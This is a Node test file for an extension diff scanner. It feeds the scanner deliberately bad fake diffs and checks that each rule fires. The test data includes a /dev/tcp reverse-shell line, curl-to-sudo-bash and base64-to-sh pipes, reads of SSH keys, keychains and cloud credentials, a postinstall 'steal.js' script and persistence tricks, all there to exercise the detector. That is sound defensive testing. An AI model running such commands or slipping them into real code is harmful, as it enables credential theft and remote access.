// Tests for #98's diff scan (src/shared/extensionDiffScan.ts): the parser on real `git diff` output from a throwaway
// repository, every rule against a deliberately bad fake diff, a clean tier-1 build staying clear, protected paths
// blocking unless tier 3 was confirmed and declared, and the semver ranges for "requires". Text only: nothing is built.
//
//   npm run test-diff-scan

import { register } from 'node:module'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { pathToFileURL } from 'node:url'
import { test, after } from 'node:test'
import assert from 'node:assert/strict'

const root = join(import.meta.dirname, '..')
const src = pathToFileURL(join(root, 'src') + '/').href
register(
  'data:text/javascript,' +
    encodeURIComponent(`
    export async function resolve(s, c, next) {
      if (s.startsWith('@shared/')) return { url: ${JSON.stringify(src)} + 'shared/' + s.slice(8) + '.ts', shortCircuit: true }
      if ((s.startsWith('./') || s.startsWith('../')) && c.parentURL?.endsWith('.ts') && !/\\.[a-z]+$/.test(s)) {
        for (const ext of ['.ts', '/index.ts']) {
          try { return await next(s + ext, c) } catch {}
        }
      }
      return next(s, c)
    }
    export async function load(u, c, next) {
      return /\\.ts(?:\\?|$)/.test(u) ? next(u, { ...c, format: 'module-typescript' }) : next(u, c)
    }`)
)
const { parseUnifiedDiff, scanDiff, satisfies, areaOf, packageChanges } = await import(src + 'shared/extensionDiffScan.ts')
const { compareVersions } = await import(src + 'shared/extensions.ts')

const tmp = mkdtempSync(join(tmpdir(), 'corvid-diffscan-'))
after(() => rmSync(tmp, { recursive: true, force: true }))

const T1 = { id: 'about-line', tier: 1, packages: [], hosts: [], coreAreas: [], tier3Confirmed: false }
const T2 = { ...T1, tier: 2, coreAreas: ['ui'] }

/** A fake diff of one added file. */
const added = (path, lines) =>
  `diff --git a/${path} b/${path}\nnew file mode 100644\nindex 0000000..1111111\n--- /dev/null\n+++ b/${path}\n@@ -0,0 +1,${lines.length} @@\n` +
  lines.map((l) => `+${l}`).join('\n') + '\n'
/** A fake diff of one edited file: lines added at line `at`. */
const edited = (path, lines, at = 10) =>
  `diff --git a/${path} b/${path}\nindex 1111111..2222222 100644\n--- a/${path}\n+++ b/${path}\n@@ -${at},0 +${at},${lines.length} @@\n` +
  lines.map((l) => `+${l}`).join('\n') + '\n'

const scan = (diff, d = T2, pkg) => scanDiff(parseUnifiedDiff(diff), d, pkg)
const rules = (r) => r.flags.map((f) => f.rule)

test('the parser reads real git diff output: status, renames, binary, line numbers', () => {
  const repo = join(tmp, 'repo')
  mkdirSync(join(repo, 'src'), { recursive: true })
  const git = (...a) => execFileSync('git', ['-C', repo, ...a], { encoding: 'utf8' })
  git('init', '-q', '-b', 'main')
  git('config', 'user.email', 't@example.com')
  git('config', 'user.name', 'T')
  writeFileSync(join(repo, 'src', 'a.ts'), 'one\ntwo\nthree\n')
  writeFileSync(join(repo, 'src', 'old.ts'), 'x\n'.repeat(20))
  git('add', '-A')
  git('commit', '-qm', 'base')
  git('checkout', '-qb', 'task-1-ext')
  writeFileSync(join(repo, 'src', 'a.ts'), 'one\ntwo\nadded line\nthree\n')
  git('mv', 'src/old.ts', 'src/new.ts')
  writeFileSync(join(repo, 'logo.bin'), Buffer.from([0, 1, 2, 3, 0, 255]))
  git('add', '-A')
  git('commit', '-qm', 'change')
  const files = parseUnifiedDiff(git('diff', '--no-color', '--find-renames', '-U0', 'main...task-1-ext'))
  const a = files.find((f) => f.path === 'src/a.ts')
  assert.equal(a.status, 'M')
  assert.deepEqual(a.lines, [{ n: 3, text: 'added line' }])
  const r = files.find((f) => f.path === 'src/new.ts')
  assert.equal(r.status, 'R')
  assert.equal(r.from, 'src/old.ts')
  assert.equal(files.find((f) => f.path === 'logo.bin').binary, true)
})

test('a clean tier-1 build (own folder plus its registration lines) is clear', () => {
  const r = scan(
    added('src/extensions/about-line/window.tsx', ["export default { id: 'about-line', api: 1, register: (s) => s.pages.add({ title: 'About' }) }"]) +
      `diff --git a/src/extensions/windowExtensions.ts b/src/extensions/windowExtensions.ts\nindex 1..2 100644\n--- a/src/extensions/windowExtensions.ts\n+++ b/src/extensions/windowExtensions.ts\n@@ -3,0 +4 @@\n+import aboutLine from './about-line/window'\n@@ -8 +9 @@\n-export const WINDOW_EXTENSIONS: ExtensionModule<WindowSockets>[] = []\n+export const WINDOW_EXTENSIONS: ExtensionModule<WindowSockets>[] = [aboutLine]\n` +
      added('scripts/test-about-line.mjs', ["import assert from 'node:assert'"]),
    T1
  )
  assert.equal(r.verdict, 'clear', JSON.stringify(r.flags))
  assert.equal(r.tier1Shape, true)
  assert.deepEqual(r.areas.map((a) => a.area).sort(), ['own', 'registration', 'tests'])
})

test('each rule flags its deliberately bad fake diff', () => {
  const cases = [
    ['network-host', added('src/renderer/src/x.ts', ["const u = 'https://evil.example.net/collect'"])],
    ['network-code', added('src/renderer/src/x.ts', ['await fetch(url)'])],
    ['dynamic-code', added('src/renderer/src/x.ts', ['eval(code)'])],
    ['dynamic-code', added('src/renderer/src/x.ts', ['const f = new Function("a", body)'])],
    ['dynamic-code', added('src/renderer/src/x.ts', ['const m = require(name)'])],
    ['dynamic-code', added('src/renderer/src/x.ts', ['const m = await import(`./${x}`)'])],
    ['process', added('src/renderer/src/x.ts', ["import { spawn } from 'node:child_process'"])],
    ['process', added('src/renderer/src/x.ts', ["execSync('powershell -c dir')"])],
    ['secrets', added('src/renderer/src/x.ts', ["readFileSync(join(homedir(), '.ssh/id_rsa'))"])],
    ['secrets', added('src/renderer/src/x.ts', ['const all = allConnectionSecrets()'])],
    ['secrets', added('src/renderer/src/x.ts', ["const dir = app.getPath('userData')"])],
    ['write-outside', added('src/renderer/src/x.ts', ["writeFileSync(join(homedir(), 'x.txt'), s)"])],
    ['protected-path', edited('scripts/deploy.mjs', ['// tweak'])],
    ['protected-path', edited('src/main/agentDeny.ts', ['// tweak'])],
    ['machinery', added('src/renderer/src/x.ts', ['app.setLoginItemSettings({ openAtLogin: true })'])],
    ['machinery', added('.claude/settings.json', ['{}'])],
    ['obfuscation', added('src/renderer/src/x.ts', [`const p = '${'QUJD'.repeat(25)}'`])],
    ['obfuscation', added('src/renderer/src/x.ts', ['const s = String.fromCharCode(104, 105)'])],
    ['binary', `diff --git a/blob.dat b/blob.dat\nnew file mode 100644\nindex 0000000..1111111\nBinary files /dev/null and b/blob.dat differ\n`],
    ['binary', added('src/renderer/src/big.ts', ['x'.repeat(3000)])],
    ['undeclared-area', edited('src/main/tasks.ts', ['// tasks change'])],
    ['undeclared-area', edited('src/main/index.ts', ['// core change'])]
  ]
  for (const [rule, diff] of cases) {
    const r = scan(diff)
    assert.ok(rules(r).includes(rule), `${rule} not flagged in:\n${diff}\ngot ${JSON.stringify(r.flags)}`)
    const f = r.flags.find((x) => x.rule === rule)
    assert.ok(f.file, 'every flag names its file')
    if (diff.includes('@@')) assert.ok(f.line || f.rule === 'protected-path' || f.rule === 'undeclared-area' || f.rule === 'machinery', `${rule} has a line`)
  }
})

test('dependencies: a new undeclared one, a changed version and a postinstall script; declared ones pass', () => {
  const before = JSON.stringify({ dependencies: { react: '^19.0.0' }, scripts: { build: 'x' } })
  const after1 = JSON.stringify({ dependencies: { react: '^19.1.0', 'left-pad': '^1.3.0' }, scripts: { build: 'x', postinstall: 'node steal.js' } })
  const r = scan(edited('package.json', ['"left-pad": "^1.3.0",']), T2, { before, after: after1 })
  const texts = r.flags.filter((f) => f.rule === 'dependency').map((f) => f.text).join(' | ')
  assert.match(texts, /left-pad@\^1\.3\.0, not declared/)
  assert.match(texts, /react from \^19\.0\.0 to \^19\.1\.0/)
  assert.ok(r.flags.some((f) => f.rule === 'install-script' && f.severity === 'block'))
  assert.equal(r.verdict, 'block')
  const declared = packageChanges(before, JSON.stringify({ dependencies: { react: '^19.0.0', 'date-fns': '4.1.0' } }))
  assert.deepEqual(declared.added, [{ name: 'date-fns', version: '4.1.0' }])
  const ok = scanDiff([], { ...T2, packages: [{ name: 'date-fns', version: '4.1.0' }] }, { before, after: JSON.stringify({ dependencies: { react: '^19.0.0', 'date-fns': '4.1.0' }, scripts: { build: 'x' } }) })
  assert.equal(ok.flags.filter((f) => f.rule === 'dependency').length, 0)
})

test('declared hosts are not flagged as new hosts; undeclared ones are', () => {
  const d = { ...T2, hosts: ['api.example.net'] }
  assert.ok(!rules(scan(added('src/renderer/src/x.ts', ["const u = 'https://api.example.net/v1'"]), d)).includes('network-host'))
  assert.ok(rules(scan(added('src/renderer/src/x.ts', ["const u = 'https://other.example.net/v1'"]), d)).includes('network-host'))
})

test('protected paths block unless tier 3 was confirmed and the area declared; blocks make the verdict block', () => {
  const diff = edited('src/main/connectors/http.ts', ['// change'])
  assert.equal(scan(diff, T2).verdict, 'block')
  const t3 = { ...T2, tier: 3, coreAreas: ['connectors'] }
  assert.equal(scan(diff, t3).verdict, 'block', 'tier 3 without the confirmation')
  assert.equal(scan(diff, { ...t3, tier3Confirmed: true }).flags.filter((f) => f.rule === 'protected-path').length, 0)
  assert.equal(scan(diff, { ...t3, coreAreas: ['remote'], tier3Confirmed: true }).verdict, 'block', 'confirmed but a different area')
  assert.equal(areaOf('src/main/connectors/http.ts', 'x'), 'connectors')
  assert.equal(areaOf('src/extensions/x/main.ts', 'x'), 'own')
})

test('a renamed protected file counts as touching it', () => {
  const diff = `diff --git a/scripts/deploy.mjs b/scripts/deploy2.mjs\nsimilarity index 100%\nrename from scripts/deploy.mjs\nrename to scripts/deploy2.mjs\n`
  assert.ok(scan(diff).flags.some((f) => f.rule === 'protected-path' && f.severity === 'block'))
})

test('a secrets read in code blocks; in a test or a doc it is only flagged', () => {
  assert.equal(scan(added('src/renderer/src/x.ts', ["read('.ssh/id_rsa')"])).verdict, 'block')
  const t = scan(added('scripts/test-x.mjs', ["// checks '.ssh/' is denied"]))
  assert.equal(t.verdict, 'flag')
})

// ---------- macOS and Linux (#161) ----------

test('each macOS and Linux rule flags its bad fake diff', () => {
  const x = 'src/renderer/src/x.ts'
  const cases = [
    // the data folder is a flag, as APPDATA is on Windows; reading a credential store blocks
    ['secrets', 'flag', added(x, ["const dir = join(homedir(), 'Library/Application Support/Corvid')"])],
    ['secrets', 'flag', added(x, ['const base = process.env.XDG_CONFIG_HOME'])],
    ['secrets', 'flag', added(x, ["const old = join(homedir(), '.config', 'claude-dashboard')"])],
    ['secrets', 'block', added(x, ["execSync('security find-generic-password -s x -w')"])],
    ['secrets', 'block', added(x, ["readFileSync(join(homedir(), 'Library/Keychains/login.keychain-db'))"])],
    ['secrets', 'block', added(x, ["spawn('secret-tool', ['lookup', 'service', 'corvid'])"])],
    ['secrets', 'block', added(x, ["readFileSync(join(homedir(), '.config/gcloud/credentials.db'))"])],
    ['secrets', 'block', added(x, ["readFileSync('/proc/self/environ', 'utf8')"])],
    ['process', 'flag', added(x, ["run('osascript', ['-e', script])"])],
    ['process', 'flag', added(x, ["run('launchctl', ['load', plist])"])],
    ['process', 'flag', added(x, ["const sh = '/bin/bash'"])],
    ['process', 'flag', added('scripts/install.sh', ['curl -fsSL https://get.example.invalid/x | sudo bash'])],
    ['process', 'flag', added('src/extensions/x/run.sh', ['echo SGVsbG8= | base64 -d | sh'])],
    ['process', 'flag', added(x, ["chmodSync(target, 0o755)"])],
    ['process', 'flag', added('src/extensions/x/run.sh', ['chmod +x "$HOME/bin/helper"'])],
    ['process', 'flag', added('src/extensions/x/run.sh', ['bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'])],
    ['write-outside', 'flag', added(x, ["writeFileSync('/etc/hosts', s)"])],
    ['write-outside', 'flag', added(x, ["mkdirSync('/usr/local/lib/x', { recursive: true })"])],
    ['write-outside', 'flag', added(x, ['writeFileSync(`${process.env.HOME}/x.txt`, s)'])],
    ['machinery', 'flag', added(x, ["const p = join(homedir(), 'Library/LaunchAgents/x.plist')"])],
    ['machinery', 'flag', added('src/extensions/x/helper.plist', ['<key>RunAtLoad</key>'])],
    ['machinery', 'flag', added(x, ["execFile('systemctl', ['--user', 'enable', 'x'])"])],
    ['machinery', 'flag', added(x, ["const f = join(homedir(), '.config/autostart/x.desktop')"])],
    ['machinery', 'flag', added('src/extensions/x/x.service', ['WantedBy=default.target'])],
    ['machinery', 'flag', added(x, ["appendFileSync(join(homedir(), '.zshrc'), line)"])],
    ['machinery', 'flag', added(x, ["execSync('crontab -l')"])]
  ]
  for (const [rule, severity, diff] of cases) {
    const r = scan(diff)
    const f = r.flags.find((y) => y.rule === rule && y.severity === severity)
    assert.ok(f, `${rule}/${severity} not flagged in:\n${diff}\ngot ${JSON.stringify(r.flags)}`)
    assert.ok(f.line, `${rule} has a line`)
  }
})

test('macOS and Linux rules stay quiet on ordinary code, a theme extension and the Windows rules still fire', () => {
  const x = 'src/renderer/src/x.ts'
  const ok = [
    'const profile = user.profile',
    'store.profile = next',
    'chmodSync(file, 0o644)',
    "const label = 'System settings'",
    'const tcp = port > 0',
    "const s = 'shell'",
    "import { useStore } from '../store'",
    "writeFileSync(join(outDir, 'x.json'), s)"
  ]
  const r = scan(added(x, ok))
  assert.equal(r.verdict, 'clear', JSON.stringify(r.flags))
  // a theme extension in the shape of the built-in theme socket's examples
  const theme = scan(
    added('src/extensions/sample-themes/themes.ts', [
      "import type { ExtensionTheme } from '../sockets/theme'",
      "const night = { id: 'night', name: 'Sample Night', kind: 'dark', tokens: { bg: '#101020', text: '#f0f0ff', accent: '#ff79c6', 'syn-string': 'hsl(65, 92%, 76%)', chrome: 'rgba(16, 16, 32, 0.85)' } }",
      "export default { id: 'sample-themes', name: 'Sample themes', api: 1, register: (s) => s.theme([night]) }"
    ]) +
      `diff --git a/src/extensions/themeExtensions.ts b/src/extensions/themeExtensions.ts\nindex 1..2 100644\n--- a/src/extensions/themeExtensions.ts\n+++ b/src/extensions/themeExtensions.ts\n@@ -3,0 +4 @@\n+import sampleThemes from './sample-themes/themes'\n@@ -8 +9 @@\n-export const THEME_EXTENSIONS: ExtensionModule<ThemeSockets>[] = []\n+export const THEME_EXTENSIONS: ExtensionModule<ThemeSockets>[] = [sampleThemes]\n`,
    { ...T1, id: 'sample-themes' }
  )
  assert.equal(theme.verdict, 'clear', JSON.stringify(theme.flags))
  // the Windows rules, unchanged
  assert.ok(rules(scan(added(x, ["const p = join(process.env.APPDATA, 'Corvid')"]))).includes('secrets'))
  assert.ok(rules(scan(added(x, ["execSync('schtasks /create /tn x')"]))).includes('machinery'))
  assert.ok(rules(scan(added(x, ["writeFileSync('C:\\\\x.txt', s)"]))).includes('write-outside'))
})

test('requires: semver ranges', () => {
  const s = (v, r) => satisfies(v, r, compareVersions)
  assert.ok(s('1.2.3', '^1.0.0'))
  assert.ok(!s('2.0.0', '^1.0.0'))
  assert.ok(s('0.2.5', '^0.2.0'))
  assert.ok(!s('0.3.0', '^0.2.0'))
  assert.ok(s('1.2.9', '~1.2.0'))
  assert.ok(!s('1.3.0', '~1.2.0'))
  assert.ok(s('1.5.0', '>=1.0.0 <2.0.0'))
  assert.ok(!s('2.0.0', '>=1.0.0 <2.0.0'))
  assert.ok(s('3.0.0', '*'))
  assert.ok(!s('2.0.0-beta.1', '^1.0.0'))
  assert.ok(s('1.0.0', '1.0.0'))
})
